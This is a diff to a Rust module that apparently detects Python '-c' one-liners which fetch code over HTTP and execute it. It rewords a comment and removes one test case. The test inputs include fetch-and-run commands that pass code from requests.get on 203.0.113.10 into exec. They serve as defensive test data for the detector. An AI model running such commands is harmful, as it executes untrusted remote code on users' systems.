@@ -735,7 +735,7 @@ fn python_code(args: &[String]) -> Option<&str> {
     None
 }
 
-/// The longest `-c` code read for a fetch that runs.
+/// Bounds the work spent reading one `-c` word.
 const MAX_FETCHED_CODE: usize = 4096;
 
 /// The HTTP fetch calls read, by dotted name. A bare `urlopen` counts after
@@ -1469,10 +1469,6 @@ mod tests {
             (
                 "python3 -c",
                 "import requests; requests.get('https://203.0.113.10/x'); exec('print(1)')",
-            ),
-            (
-                "python3 -c",
-                "import requests; exec(requests.get('https://203.0.113.10/x').json())",
             ),
             (
                 "python3 -c",
